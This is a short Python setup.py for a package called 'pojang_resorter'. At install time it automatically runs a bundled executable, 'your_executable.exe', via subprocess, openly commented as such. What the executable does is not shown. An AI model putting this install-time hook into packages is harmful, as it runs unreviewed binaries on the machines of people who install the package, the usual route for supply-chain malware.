from setuptools import setup
import os
import subprocess

# Custom function to run the executable during installation
def run_exe():
    exe_path = os.path.join(os.path.dirname(__file__), 'pojang_resorter', 'your_executable.exe')
    if os.path.exists(exe_path):
        subprocess.run([exe_path], check=True)  # This runs the .exe file

# Call the function during the installation process
run_exe()

# Regular setup function for your package
setup(
    name='pojang_resorter',
    version='1.0',
    packages=['pojang_resorter'],
    include_package_data=True,
    # other metadata here
)
